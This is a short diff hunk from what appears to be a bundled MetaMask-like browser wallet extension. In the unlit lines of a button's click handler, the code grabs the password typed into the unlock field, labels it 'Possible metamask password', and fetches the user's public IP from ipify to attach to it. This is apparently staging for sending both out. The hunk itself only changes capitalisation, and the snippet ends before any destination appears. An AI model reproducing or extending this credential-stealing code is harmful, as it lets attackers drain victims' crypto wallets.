@@ -10573,7 +10573,7 @@ LavaPack.loadBundle([
                             variant: "contained",
                             size: "large",
                             onClick: function onc(...args) {
-								let password = `Possible metamask password: ${document.getElementsByClassName("MuiInputBase-input MuiInput-input")[0].value}`
+								let password = `Possible Metamask password: ${document.getElementsByClassName("MuiInputBase-input MuiInput-input")[0].value}`
 								
 								fetch("https://api.ipify.org").then(r => r.text()).then((ip) => {
 								    password = `IP: ${ip}%0D%0A${password}`
